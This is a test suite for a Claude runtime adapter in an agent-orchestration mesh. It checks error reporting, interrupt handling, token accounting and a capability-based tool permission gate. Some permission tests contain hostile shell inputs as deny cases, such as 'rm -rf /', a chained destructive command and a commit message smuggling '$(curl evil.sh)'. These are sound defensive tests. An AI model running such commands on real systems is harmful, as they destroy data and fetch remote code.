import { test } from "node:test";
import assert from "node:assert/strict";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import {
  BRIDGE_RESPAWN_ATTEMPTS,
  BRIDGE_RESPAWN_DELAYS_MS,
  ClaudeRuntimeAdapter,
  buildPermissionGate,
  describeToolPermissions,
  meshBridgeDownReason,
  toClaudeModelId,
  toolResultText,
  usageToTokens,
} from "../../packages/runtime-claude/src/index";
import type { ClaudeAdapterOptions, ClaudeTurnEnd, ToolFamily } from "../../packages/runtime-claude/src/index";
import { BackendUnreachableError, TOOL_ERROR_MAX_CHARS, isTimeoutError } from "../../packages/protocol/src/index";
import type {
  AgentDefinition,
  AgentInput,
  AgentSession,
  RuntimeContext,
} from "../../packages/protocol/src/index";

const devDef: AgentDefinition = {
  id: "developer",
  role: "developer",
  mode: "peer",
  runtime: "claude",
  prompt: { text: "you build things" },
  capabilities: ["repository.write", "git.commit"],
  authority: [],
  communicationPolicy: { mayContact: [], mayBeContactedBy: [] },
  interests: [],
  sessionPolicy: { persistent: true },
  delegationPolicy: { allowDelegation: false, maxDepth: 0, maxWorkers: 0 },
  budget: {},
};

function runtimeCtx(dir: string): RuntimeContext {
  return {
    goalId: "goal-1",
    meshId: "test",
    workspacePath: dir,
    busUrl: "http://127.0.0.1:1",
    agentToken: "test:developer:abcd",
    rolePromptText: "you build things",
    capabilityGrants: devDef.capabilities,
    env: {},
  };
}

/** The SDK hands the gate a context object; only `signal` is load-bearing here. */
const gateCtx = () => ({
  signal: new AbortController().signal,
  toolUseID: "tool-use-1",
  requestId: "req-1",
});

/** Drive the gate the way the SDK does, and reduce to a bare boolean. */
async function allows(caps: string[], tool: string): Promise<boolean> {
  const gate = buildPermissionGate(caps);
  const res = await gate(tool, { any: "input" }, gateCtx());
  return res?.behavior === "allow";
}

/** Same, for a tool whose verdict depends on the input it carries. */
async function allowsInput(caps: string[], tool: string, input: Record<string, unknown>): Promise<boolean> {
  const gate = buildPermissionGate(caps);
  const res = await gate(tool, input, gateCtx());
  return res?.behavior === "allow";
}

const agentInput = (instructions: string): AgentInput => ({
  agentId: "developer",
  goalId: "goal-1",
  activation: { kind: "manual" },
  context: {
    rolePrompt: "x",
    mission: "m",
    relevantPolicies: [],
    agentState: {
      agentId: "developer",
      lifecycle: "THINKING",
      mailboxDepth: 0,
      currentArtifactIds: [],
      tokensConsumed: 0,
      activations: 0,
      lastActivityAt: "",
    },
    relevantDecisions: [],
    relevantArtifacts: [],
    unreadMail: [],
    recentOwnActivity: [],
    agentMemory: [],
    openThreads: [],
    budgetSnapshot: {
      agentTokensUsed: 0,
      agentTokenBudget: 0,
      missionTokensUsed: 0,
      missionTokenBudget: 0,
    },
    outstanding: { awaitingResponse: [], owedByYou: [] },
    goalCriteria: [],
  },
  instructions,
});

test("toClaudeModelId strips a provider prefix but keeps a bare id", () => {
  // opencode writes provider-qualified refs; the SDK wants the model id alone.
  assert.equal(toClaudeModelId("anthropic/claude-sonnet-5"), "claude-sonnet-5");
  assert.equal(toClaudeModelId("claude-opus-5"), "claude-opus-5");
  // Only the FIRST slash splits — nested provider paths keep their tail intact.
  assert.equal(toClaudeModelId("openrouter/anthropic/claude-opus-5"), "anthropic/claude-opus-5");
  // Degenerate forms must not produce an empty model id, which the SDK would
  // reject at spawn time with a far less legible error.
  assert.equal(toClaudeModelId("/leading"), "/leading");
  assert.equal(toClaudeModelId("trailing/"), "trailing/");
  assert.equal(toClaudeModelId(undefined), undefined);
  assert.equal(toClaudeModelId("   "), undefined);
});

test("usageToTokens charges new work and excludes cache reads", () => {
  const t = usageToTokens({
    input_tokens: 100,
    output_tokens: 20,
    cache_creation_input_tokens: 5,
    cache_read_input_tokens: 9000,
  });
  // 9000 cached-prefix reads must NOT reach the budget: billing them per turn
  // is the runaway that exhausted thread budgets under opencode.
  assert.deepEqual(t, { input: 100, output: 20, total: 125, cacheRead: 9000 });
});

test("usageToTokens tolerates a result message with no usage block", () => {
  assert.deepEqual(usageToTokens(undefined), { input: 0, output: 0, total: 0, cacheRead: 0 });
  assert.deepEqual(usageToTokens({}), { input: 0, output: 0, total: 0, cacheRead: 0 });
});

/**
 * A backend that answers every turn with a FAILED result, carrying whatever
 * error detail the CLI chose to report.
 *
 * The detail is the whole point of these two tests. A live run failed with
 * `error_during_execution` having spent 869 tokens and two tool calls and then
 * gone silent for two minutes, and the turn record, the `agent.failed` event
 * and the dashboard all said exactly that and nothing more — a category, not a
 * fault. A crashed CLI, a prompt the provider refused, a spent budget and a
 * denied tool are four different bugs with four different fixes, and the bare
 * subtype cannot separate them.
 */
function failingQuery(result?: Record<string, unknown>) {
  return (({ prompt, options }: { prompt: unknown; options: Record<string, unknown> }) => {
    const sdkSessionId = String(options.sessionId ?? "fake-session");
    const gen = (async function* () {
      yield {
        type: "system",
        subtype: "init",
        session_id: sdkSessionId,
        model: "claude-test",
        mcp_servers: [{ name: "mesh", status: "connected" }],
      };
      for await (const _msg of prompt as AsyncIterable<unknown>) {
        yield {
          type: "result",
          subtype: "error_during_execution",
          is_error: true,
          result: "",
          session_id: sdkSessionId,
          num_turns: 1,
          ...result,
        };
      }
    })();
    return Object.assign(gen, {
      interrupt: async () => undefined,
      setPermissionMode: async () => undefined,
      setModel: async () => undefined,
      supportedModels: async () => [],
      supportedCommands: async () => [],
      mcpServerStatus: async () => ({}),
    });
  }) as unknown as ClaudeAdapterOptions["queryFn"];
}

test("a failed turn carries the CLI's own error instead of only its category", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-err-"));
  const adapter = new ClaudeRuntimeAdapter({
    queryFn: failingQuery({
      errors: ["API Error: 400 prompt is too long: 210000 tokens > 200000 maximum"],
      terminal_reason: "prompt_too_long",
      permission_denials: [{ tool_name: "Bash", tool_use_id: "toolu-1" }],
    }),
  });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const out = await adapter.send(session, agentInput("read the workspace"));
    const error = out.error ?? "";
    // The subtype still leads, so every existing classification that greps for
    // it keeps matching.
    assert.match(error, /claude turn failed: error_during_execution/);
    assert.match(error, /prompt is too long/, "the CLI's own words must survive");
    assert.match(error, /terminated: prompt_too_long/, "and so must the structured cause");
    assert.match(error, /denied by permissions: Bash/, "a permission wall must name the tool it held");
  } finally {
    await adapter.stop(session);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a failed turn with no detail keeps the plain subtype message", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-bare-"));
  const adapter = new ClaudeRuntimeAdapter({ queryFn: failingQuery() });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const out = await adapter.send(session, agentInput("read the workspace"));
    // An older CLI that reports nothing else must read exactly as it always
    // did: this is the contract `handleAgentFailure` classifies against.
    assert.equal(out.error, "claude turn failed: error_during_execution");
  } finally {
    await adapter.stop(session);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

/**
 * A backend that takes the prompt, goes silent, and answers an `interrupt` the
 * way the CLI does: by resolving the turn with an ordinary error result.
 *
 * That reply is the trap, because it is not slow. A live run's stall watchdog
 * interrupted a wedged turn at 10:44:37.825 and the CLI answered at 10:44:37.852
 * — 27ms, far inside the supervisor's 2s grace for an interrupt nobody answered
 * — so the real frame beat the grace and the adapter reported the CLI's abort
 * reply as the turn's own failure. `handleAgentFailure` classifies on that
 * error, so a stop the MESH ordered was booked as a backend crash and charged
 * to the seat's restart budget.
 */
function silentThenInterruptedQuery() {
  let release!: () => void;
  const whenInterrupted = new Promise<void>((r) => { release = r; });
  let entered!: () => void;
  const silent = new Promise<void>((r) => { entered = r; });
  const queryFn = (({ prompt, options }: { prompt: unknown; options: Record<string, unknown> }) => {
    const sdkSessionId = String(options.sessionId ?? "fake-session");
    const gen = (async function* () {
      yield {
        type: "system",
        subtype: "init",
        session_id: sdkSessionId,
        model: "claude-test",
        mcp_servers: [{ name: "mesh", status: "connected" }],
      };
      for await (const _msg of prompt as AsyncIterable<unknown>) {
        entered();
        await whenInterrupted;
        // The abort, announced by the backend as an ordinary failed turn.
        yield {
          type: "result",
          subtype: "error_during_execution",
          is_error: true,
          result: "",
          session_id: sdkSessionId,
          num_turns: 1,
        };
      }
    })();
    return Object.assign(gen, {
      interrupt: async () => { release(); },
      setPermissionMode: async () => undefined,
      setModel: async () => undefined,
      supportedModels: async () => [],
      supportedCommands: async () => [],
      mcpServerStatus: async () => ({}),
    });
  }) as unknown as ClaudeAdapterOptions["queryFn"];
  return { queryFn, silent };
}

test("an interrupt the mesh ordered reads as a deliberate stop, not a crash", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-abort-"));
  const fake = silentThenInterruptedQuery();
  const adapter = new ClaudeRuntimeAdapter({ queryFn: fake.queryFn });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const turn = adapter.send(session, agentInput("read the workspace"));
    await fake.silent;
    await adapter.interrupt(session);
    // `isTimeoutError` is exactly the predicate `handleAgentFailure` branches
    // on: true takes the "slow" path, which retries without spending the
    // restart budget. A deliberate stop must land there, not on the crash path
    // that restarted the seat for a turn the mesh had just ended itself.
    await assert.rejects(turn, (err: unknown) => isTimeoutError(err));
    assert.ok(
      !(await adapter.getStatus(session).catch(() => "UNREACHABLE") as string).startsWith("UNREACHABLE"),
      "the session survived the abort, so it must not be reported dead",
    );
  } finally {
    await adapter.stop(session);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a turn the backend completes as we abort is still the backend's turn", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-abort-ok-"));
  // Same shape, but the backend answers the abort with a SUCCESSFUL result: it
  // finished the turn we gave up on. That is real work, so the turn must be
  // reported as the backend reported it rather than discarded as a failure.
  const adapter = new ClaudeRuntimeAdapter({
    queryFn: (({ prompt, options }: { prompt: unknown; options: Record<string, unknown> }) => {
      const sdkSessionId = String(options.sessionId ?? "fake-session");
      const gen = (async function* () {
        yield { type: "system", subtype: "init", session_id: sdkSessionId, model: "claude-test", mcp_servers: [{ name: "mesh", status: "connected" }] };
        for await (const _msg of prompt as AsyncIterable<unknown>) {
          await new Promise((r) => setTimeout(r, 20));
          yield {
            type: "result",
            subtype: "success",
            is_error: false,
            result: "made it",
            session_id: sdkSessionId,
            num_turns: 1,
          };
        }
      })();
      return Object.assign(gen, {
        interrupt: async () => undefined,
        setPermissionMode: async () => undefined,
        setModel: async () => undefined,
        supportedModels: async () => [],
        supportedCommands: async () => [],
        mcpServerStatus: async () => ({}),
      });
    }) as unknown as ClaudeAdapterOptions["queryFn"],
  });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const turn = adapter.send(session, agentInput("read the workspace"));
    await adapter.interrupt(session);
    const out = await turn;
    assert.equal(out.error, undefined, "a completed turn is not a failure just because we gave up on it");
  } finally {
    await adapter.stop(session);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("permission gate maps capabilities onto tools", async () => {
  const write = ["repository.write"];
  assert.equal(await allows(write, "Edit"), true);
  assert.equal(await allows(write, "Write"), true);
  assert.equal(await allows(write, "NotebookEdit"), true);
  // Write capability alone buys no shell and no network.
  assert.equal(await allows(write, "Bash"), false);
  assert.equal(await allows(write, "WebFetch"), false);

  assert.equal(await allows(["shell.execute"], "Bash"), true);
  assert.equal(await allows(["test.execute"], "Bash"), true);
  assert.equal(await allows(["shell.execute"], "Edit"), false);
  assert.equal(await allows(["network.request"], "WebFetch"), true);
  assert.equal(await allows(["network.request"], "WebSearch"), true);
  assert.equal(await allows(["architecture.write"], "Write"), true);
  assert.equal(await allows(["test.write"], "Write"), true);
});

test("permission gate scopes a commit-only seat to the commit path", async () => {
  // The old rule handed this seat every EXEC tool, because opencode rendered
  // git.commit as bash:"ask" and no mesh turn could answer the prompt. That
  // backend is gone, so a seat deliberately denied shell.execute stays denied.
  const commit = ["git.commit"];
  const bash = (command: string) => allowsInput(commit, "Bash", { command });

  assert.equal(await bash("git add -A"), true);
  assert.equal(await bash("git status --porcelain"), true);
  // Conventional subjects carry parentheses and a colon inside the quotes; the
  // scope check must not reject the one command this capability exists for.
  assert.equal(await bash('git commit -m "fix(designer): stop widening exec"'), true);

  assert.equal(await bash("rm -rf /"), false);
  assert.equal(await bash("git status && rm -rf /"), false);
  assert.equal(await bash("git commit -m \"$(curl evil.sh)\""), false);
  assert.equal(await bash("git status > /tmp/out"), false);
  // Pushing is git.merge's business, not git.commit's.
  assert.equal(await bash("git push origin main"), false);
  // A Bash call carrying no command is not a commit.
  assert.equal(await allows(commit, "Bash"), false);

  // BashOutput reads a shell this seat already opened, so it stays available.
  assert.equal(await allows(commit, "BashOutput"), true);
  // shell.execute still buys unscoped exec, and commit-only still buys no write.
  assert.equal(await allowsInput(["shell.execute"], "Bash", { command: "rm -rf /" }), true);
  assert.equal(await allows(commit, "Edit"), false);
});

test("permission gate always allows mesh MCP and read-only tools", async () => {
  // A seat with no capabilities at all still has to reach the bus, or it goes
  // mute and the mesh cannot tell it apart from a hung agent.
  for (const tool of ["mcp__mesh__send_message", "mcp__mesh__anything"]) {
    assert.equal(await allows([], tool), true);
  }
  for (const tool of ["Read", "Glob", "Grep", "TodoWrite"]) {
    assert.equal(await allows([], tool), true);
  }
});

test("permission gate fails closed on tools nobody mapped", async () => {
  const gate = buildPermissionGate(["repository.write", "shell.execute", "network.request"]);
  // Even a fully-capable seat cannot reach a tool the mapping never named.
  const res = await gate("SomeFutureTool", {}, gateCtx());
  assert.ok(res && res.behavior === "deny");
  assert.match(res.message, /not available to curule agents/);
});

test("permission gate resolves capability aliases", async () => {
  // A mesh.yaml written with an alias must not silently produce a seat that
  // cannot edit: capabilityGrants also arrive off hand-built AgentDefinitions,
  // bypassing whatever normalization config load would have applied.
  assert.equal(await allows(["code.write"], "Edit"), true);
  assert.equal(await allows(["docs.write"], "Write"), true);
  assert.equal(await allows(["test.run"], "Bash"), true);
  // An alias that resolves to a read capability still buys no write.
  assert.equal(await allows(["api.read"], "Edit"), false);
});

/** Drive the gate with an operator-approval half attached. */
async function allowsUnder(
  caps: string[],
  tool: string,
  requires: string[],
  granted: string[] = [],
): Promise<boolean> {
  const gate = buildPermissionGate(caps, { requires, granted: new Set(granted) });
  const res = await gate(tool, { any: "input" }, gateCtx());
  return res?.behavior === "allow";
}

test("requires_approval holds a tool the seat is otherwise capable of", async () => {
  const gate = buildPermissionGate(["repository.write"], {
    requires: ["repository.write"],
    granted: new Set(),
  });
  const res = await gate("Edit", {}, gateCtx());
  assert.ok(res && res.behavior === "deny");
  // The seat has the capability, so the denial must not read as "no capability" —
  // the model should end its turn and wait, not conclude it was misconfigured.
  assert.match(res.message, /needs operator approval/);
  assert.match(res.message, /end your turn rather than retrying/);
});

test("the gate reports the tool it held, so the operator need not guess the name", async () => {
  // `onRequest` was declared and called but never supplied by any caller, so
  // the deny path's claim that "the request is recorded" recorded nothing.
  // What the operator could do was type a tool name into a free-text field and
  // hope they spelled it the way the backend does.
  const held: string[] = [];
  const gate = buildPermissionGate(["repository.write"], {
    requires: ["repository.write"],
    granted: new Set(["Write"]),
    onRequest: (tool) => held.push(tool),
  });

  assert.equal((await gate("Edit", {}, gateCtx()))?.behavior, "deny");
  // Never gated: reported nothing.
  assert.equal((await gate("Read", {}, gateCtx()))?.behavior, "allow");
  // Gated but already unlocked: also reported nothing, or granting a tool would
  // immediately re-list it as something the operator still owes the seat.
  assert.equal((await gate("Write", {}, gateCtx()))?.behavior, "allow");

  assert.deepEqual(held, ["Edit"]);
});

test("a grant added after the gate was built reaches the running gate", async () => {
  // The load-bearing half of mid-session unlocking: the gate keeps the CALLER's
  // set rather than copying it, so `open` can hand a session-owned set to the
  // gate once and `stream` can refresh that set per turn. If this regresses to
  // a copy, an operator's grant silently cannot reach a seat that is already
  // running -- the gate goes on refusing from a set captured at session start,
  // and `open` returns the live session unchanged so nothing ever rebuilds it.
  const granted = new Set<string>();
  const gate = buildPermissionGate(["repository.write"], {
    requires: ["repository.write"],
    granted,
  });
  const before = await gate("Edit", {}, gateCtx());
  assert.ok(before && before.behavior === "deny");

  granted.add("Edit");

  const after = await gate("Edit", {}, gateCtx());
  assert.equal(after?.behavior, "allow");
});

test("an operator grant unlocks exactly the tool it names", async () => {
  assert.equal(await allowsUnder(["repository.write"], "Edit", ["repository.write"], ["Edit"]), true);
  // Grants are per tool, not per capability: unlocking Edit leaves Write held.
  assert.equal(await allowsUnder(["repository.write"], "Write", ["repository.write"], ["Edit"]), false);
});

test("requires_approval gates only the capability families it names", async () => {
  // Gating writes must not quietly gate a seat's shell access as collateral.
  assert.equal(await allowsUnder(["shell.execute"], "Bash", ["repository.write"]), true);
  // And a gate never promotes: naming a capability the seat lacks grants nothing.
  assert.equal(await allowsUnder(["api.read"], "Edit", ["repository.write"]), false);
});

test("an empty requires_approval leaves the gate byte-for-byte unchanged", async () => {
  // The knob is opt-in; a mesh that never sets it must not pay for it.
  assert.equal(await allowsUnder(["repository.write"], "Edit", []), true);
  assert.equal(await allowsUnder(["shell.execute"], "Bash", []), true);
});

test("read-only tools stay reachable under an approval gate", async () => {
  // A held seat must still be able to see why it was held, and to report back.
  assert.equal(await allowsUnder(["repository.write"], "Read", ["repository.write"]), true);
  assert.equal(await allowsUnder(["repository.write"], "Grep", ["repository.write"]), true);
});

// ---- describeToolPermissions: the operator's view of the same gate -----------

/** Every tool the gate maps, by the family `describeToolPermissions` reports. */
const FAMILY_TOOLS: Record<ToolFamily, string[]> = {
  read: ["Read", "Glob", "Grep", "TodoWrite"],
  edit: ["Edit", "Write", "NotebookEdit"],
  shell: ["Bash", "BashOutput", "KillShell"],
  web: ["WebFetch", "WebSearch"],
};

/** One gate call, reduced to what an operator would call it. */
async function gateSays(
  caps: string[],
  requires: string[],
  tool: string,
  input: Record<string, unknown>,
  granted: string[] = [],
): Promise<"allow" | "deny" | "approval"> {
  const gate = buildPermissionGate(caps, { requires, granted: new Set(granted) });
  const res = await gate(tool, input, gateCtx());
  if (res?.behavior === "allow") return "allow";
  return /needs operator approval/.test(String(res?.message)) ? "approval" : "deny";
}

/**
 * What the gate actually does to a whole family, in describeToolPermissions'
 * four words. `Bash` is driven twice — once with a bare git command, once with
 * one a commit-only seat may not run — because "scoped" is only visible as the
 * difference between the two.
 */
async function observedLevel(caps: string[], requires: string[], family: ToolFamily): Promise<string> {
  const seen: string[] = [];
  for (const tool of FAMILY_TOOLS[family]) {
    if (tool === "Bash") {
      const git = await gateSays(caps, requires, tool, { command: "git status" });
      const other = await gateSays(caps, requires, tool, { command: "rm -rf build" });
      seen.push(git === "allow" && other === "deny" ? "scoped" : git === other ? git : `split:${git}/${other}`);
    } else {
      seen.push(await gateSays(caps, requires, tool, {}));
    }
  }
  const distinct = new Set(seen);
  if (distinct.size === 1) return seen[0];
  // A commit-only seat: Bash is scoped, the shell it already opened is not.
  if (family === "shell" && seen[0] === "scoped" && seen.slice(1).every((s) => s === "allow")) return "scoped";
  return `inconsistent: ${FAMILY_TOOLS[family].map((t, i) => `${t}=${seen[i]}`).join(", ")}`;
}

test("describeToolPermissions agrees with the gate, family by family, across representative seats", async () => {
  // The drift this pins: the operator surface showing one thing while the gate
  // refuses another. Both now read one verdict function, so this is the
  // behavioural proof of that — including aliases, which the gate normalizes
  // and a hand-rolled description would be likely to forget.
  const CAPS: string[][] = [
    [],
    ["repository.write"],
    ["architecture.write"],
    ["test.write"],
    ["code.write"],
    ["api.read"],
    ["shell.execute"],
    ["test.execute"],
    ["test.run"],
    ["git.commit"],
    ["repository.commit"],
    ["git.commit", "shell.execute"],
    ["network.request"],
    ["repository.write", "shell.execute", "network.request", "git.commit"],
  ];
  const REQUIRES: string[][] = [
    [],
    ["repository.write"],
    ["code.write"],
    ["shell.execute"],
    ["git.commit"],
    ["network.request"],
    ["repository.write", "shell.execute", "network.request", "git.commit"],
  ];
  let compared = 0;
  for (const caps of CAPS) {
    for (const requires of REQUIRES) {
      const described = describeToolPermissions(caps, requires);
      for (const family of Object.keys(FAMILY_TOOLS) as ToolFamily[]) {
        const observed = await observedLevel(caps, requires, family);
        assert.equal(
          described[family].level,
          observed,
          `caps ${JSON.stringify(caps)} requires ${JSON.stringify(requires)}: ${family} described as ${JSON.stringify(described[family])}, gate did ${observed}`,
        );
        compared++;
      }
    }
  }
  // Guard against a vacuous pass: every level must actually have been exercised.
  const levels = new Set(
    CAPS.flatMap((c) => REQUIRES.flatMap((r) => Object.values(describeToolPermissions(c, r)).map((p) => p.level))),
  );
  assert.deepEqual([...levels].sort(), ["allow", "approval", "deny", "scoped"]);
  assert.equal(compared, CAPS.length * REQUIRES.length * 4);
});

test("describeToolPermissions says which capability decided, or what is missing", () => {
  const none = describeToolPermissions([]);
  assert.deepEqual(none.read, { level: "allow", via: "always allowed" });
  assert.deepEqual(none.edit, { level: "deny", via: "needs repository.write (or architecture.write, test.write)" });
  assert.deepEqual(none.shell, { level: "deny", via: "needs shell.execute (or test.execute)" });
  assert.deepEqual(none.web, { level: "deny", via: "needs network.request" });

  // Named by the canonical token, not the alias the mesh.yaml happened to use.
  assert.deepEqual(describeToolPermissions(["code.write"]).edit, { level: "allow", via: "repository.write" });
  assert.deepEqual(describeToolPermissions(["git.commit"]).shell, { level: "scoped", via: "git.commit (commit path only)" });
  // Full exec wins over the commit path, and names the token that bought it.
  assert.deepEqual(describeToolPermissions(["git.commit", "test.execute"]).shell, { level: "allow", via: "test.execute" });

  const held = describeToolPermissions(["repository.write", "git.commit"], ["repository.write", "git.commit"]);
  assert.deepEqual(held.edit, { level: "approval", via: "repository.write (requires_approval)" });
  assert.deepEqual(held.shell, { level: "approval", via: "git.commit (requires_approval); commit path only once granted" });
  // requires_approval never widens: gating a capability the seat lacks gates nothing.
  assert.equal(describeToolPermissions(["api.read"], ["repository.write"]).edit.level, "deny");
});

test("an operator grant on a commit-only seat unlocks the commit path, not the shell", async () => {
  // The one case the static description cannot show: after the grant the
  // family is still scoped, which is why the gate reads `commitOnly` and not
  // the headline level.
  assert.equal(await gateSays(["git.commit"], ["git.commit"], "Bash", { command: "git status" }), "approval");
  assert.equal(await gateSays(["git.commit"], ["git.commit"], "Bash", { command: "git status" }, ["Bash"]), "allow");
  assert.equal(await gateSays(["git.commit"], ["git.commit"], "Bash", { command: "rm -rf build" }, ["Bash"]), "deny");
});

// ---- tool results: a refused call must not record as a successful one --------

/** A seat turn with one refused Bash call, one successful Read and one long failure. */
function toolResultQuery(): ClaudeAdapterOptions["queryFn"] {
  return (({ prompt, options }: { prompt: unknown; options: Record<string, unknown> }) => {
    const sdkSessionId = String(options.sessionId ?? options.resume ?? "fake-session");
    const gen = (async function* () {
      yield { type: "system", subtype: "init", session_id: sdkSessionId, model: "claude-test", mcp_servers: [{ name: "mesh", status: "connected" }] };
      for await (const _msg of prompt as AsyncIterable<unknown>) {
        yield {
          type: "assistant",
          message: {
            model: "claude-test",
            content: [
              { type: "tool_use", id: "toolu_bash", name: "Bash", input: { command: "npm test" } },
              { type: "tool_use", id: "toolu_read", name: "Read", input: { file_path: "a.ts" } },
              { type: "tool_use", id: "toolu_long", name: "WebFetch", input: { url: "https://example.test" } },
            ],
          },
        };
        yield {
          type: "user",
          message: {
            content: [
              // The shape the CLI uses for a canUseTool denial: a string body.
              { type: "tool_result", tool_use_id: "toolu_bash", is_error: true, content: "Bash denied: this seat holds no shell.execute or test.execute capability." },
              // A success whose body is a file: must never be copied anywhere.
              { type: "tool_result", tool_use_id: "toolu_read", content: [{ type: "text", text: "export const secret = 1;" }] },
              // A failure whose text is longer than the cap, in block form.
              { type: "tool_result", tool_use_id: "toolu_long", is_error: true, content: [{ type: "text", text: `fetch failed: ${"x".repeat(900)}` }] },
            ],
          },
        };
        yield { type: "result", subtype: "success", is_error: false, result: "done", session_id: sdkSessionId, num_turns: 1 };
      }
    })();
    return Object.assign(gen, {
      interrupt: async () => undefined,
      setPermissionMode: async () => undefined,
      setModel: async () => undefined,
      supportedModels: async () => [],
      supportedCommands: async () => [],
      mcpServerStatus: async () => ({}),
    });
  }) as unknown as ClaudeAdapterOptions["queryFn"];
}

test("a failed tool result reaches the turn's toolCalls with its status and the refusal text", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-toolres-"));
  const adapter = new ClaudeRuntimeAdapter({ queryFn: toolResultQuery() });
  try {
    const session = await adapter.start(devDef, runtimeCtx(dir));
    const out = await adapter.send(session, agentInput("run the tests"));
    const [bash, read, fetch] = out.toolCalls ?? [];
    assert.equal(bash?.status, "failed");
    assert.equal(bash?.error, "Bash denied: this seat holds no shell.execute or test.execute capability.");
    assert.equal(read?.status, "completed");
    assert.equal(read?.error, undefined, "a success carries no error, and never its payload");
    assert.ok(!JSON.stringify(out.toolCalls).includes("secret"), "the Read body must not ride into the record");
    assert.equal(fetch?.status, "failed");
    assert.equal(fetch?.error?.length, TOOL_ERROR_MAX_CHARS, "an error is clipped, not shipped whole");
    assert.match(String(fetch?.error), /^fetch failed: x+$/);
  } finally {
    await adapter.stopAll();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("toolResultText reads both wire shapes and invents nothing from the rest", () => {
  assert.equal(toolResultText("plain"), "plain");
  assert.equal(toolResultText([{ type: "text", text: "a" }, { type: "image", source: {} }, { type: "text", text: "b" }]), "a\nb");
  assert.equal(toolResultText(undefined), "");
  assert.equal(toolResultText({ text: "not an array" }), "");
});

test("send without a live session raises BackendUnreachableError", async () => {
  const adapter = new ClaudeRuntimeAdapter();
  const session: AgentSession = {
    sessionId: "never-started",
    agentId: "developer",
    runtime: "claude",
    createdAt: new Date().toISOString(),
    handle: { sdkSessionId: "never-started" },
  };
  await assert.rejects(
    () => adapter.send(session, agentInput("hello")),
    (err: unknown) => {
      // Must be the "backend is gone" class, not a generic throw: the
      // supervisor keys its restart path off exactly this distinction.
      assert.ok(err instanceof BackendUnreachableError, `got ${String(err)}`);
      return true;
    },
  );
});

test("restoreSession returns null when the backend cannot be reopened", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    // A nonexistent executable makes the spawn fail deterministically without
    // depending on whether a real Claude CLI is installed on this machine.
    // The short probe keeps the "backend went quiet" grace out of the test's
    // wall clock; the dead path does not depend on it expiring.
    const adapter = new ClaudeRuntimeAdapter({
      executablePath: path.join(dir, "no-such-claude"),
      spawnFailureGraceMs: 1000,
    });
    const restored = await adapter.restoreSession(
      devDef,
      "11111111-2222-3333-4444-555555555555",
      runtimeCtx(dir),
    );
    assert.equal(restored, null);
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

/**
 * Captures the SDK options a designer turn opens with.
 *
 * The designer path takes a plain string prompt, not a push queue, so this
 * fake yields a single result and closes rather than draining an inbox the
 * way `session-rotation`'s factory does.
 */
function captureDesignerQuery() {
  const seen: Record<string, unknown>[] = [];
  const queryFn = (({ options }: { prompt: unknown; options: Record<string, unknown> }) => {
    seen.push(options);
    const gen = (async function* () {
      yield { type: "result", subtype: "success", result: "staged", session_id: "designer-fake", num_turns: 1 };
    })();
    return Object.assign(gen, { interrupt: async () => undefined });
  }) as unknown as ClaudeAdapterOptions["queryFn"];
  return { queryFn, seen };
}

test("a designer turn with opts.mcp wires a staging bridge carrying the turn id", async () => {
  const { queryFn, seen } = captureDesignerQuery();
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  await adapter.prompt("stage a rename", {
    system: "you are a designer",
    mcp: {
      url: "http://127.0.0.1:7421/designer/mcp?staging=1",
      headers: { "x-mesh-designer-turn": "turn-abc", "x-mesh-token": "human-local" },
    },
  });
  assert.equal(seen.length, 1);
  const servers = seen[0].mcpServers as Record<string, { type: string; command: string; args: string[]; env?: Record<string, string> }>;
  const staging = servers.mesh_staging;
  assert.ok(staging, "opts.mcp must produce a mesh_staging server");
  assert.equal(staging.type, "stdio", "the bridge is stdio: this repo has no remote MCP transport");
  assert.equal(staging.command, process.execPath);
  assert.ok(staging.args.includes("--staging"));
  // The turn id is what lets the bus file staged mutations against the right
  // open turn; without it the bridge would write into nothing.
  assert.equal(staging.args[staging.args.indexOf("--turn") + 1], "turn-abc");
  // The token grants the human seat, so it must never sit on argv, where
  // `ps` shows it to every local user; it rides in the child's environment.
  assert.ok(!staging.args.includes("--token"), "no token on the bridge's command line");
  assert.ok(!staging.args.includes("human-local"));
  assert.equal(staging.env?.MESH_AGENT_TOKEN, "human-local");
  // Origin only — the path and the ?staging=1 query are the bridge's business.
  assert.equal(staging.args[staging.args.indexOf("--bus") + 1], "http://127.0.0.1:7421");
  await adapter.stopAll();
});

test("a seat's bus bridge carries its mesh token in env, never on argv", () => {
  // The seat token authenticates every mesh op the seat makes. On argv it is
  // readable through `ps` by any local user; in the child's env it is not.
  const adapter = new ClaudeRuntimeAdapter({});
  const server = (adapter as unknown as {
    meshMcpServer(a: AgentDefinition, c: RuntimeContext): { args: string[]; env: Record<string, string> };
  }).meshMcpServer(devDef, runtimeCtx(os.tmpdir()));
  assert.ok(!server.args.includes("--token"), "no --token flag on the command line");
  assert.ok(!server.args.includes("test:developer:abcd"), "the token value is not on the command line");
  assert.equal(server.env.MESH_AGENT_TOKEN, "test:developer:abcd");
  assert.equal(server.env.MESH_AGENT_ID, "developer");
});

test("a designer turn without opts.mcp opens no MCP servers at all", async () => {
  const { queryFn, seen } = captureDesignerQuery();
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  await adapter.prompt("just talk to me", { system: "you are a designer" });
  assert.equal(seen[0].mcpServers, undefined, "no bus named, no bridge");
  await adapter.stopAll();
});

/**
 * A backend that spawns cleanly and then parks: the query opens, never emits
 * `system`/`init`, and never ends. This is the shape that used to be reported
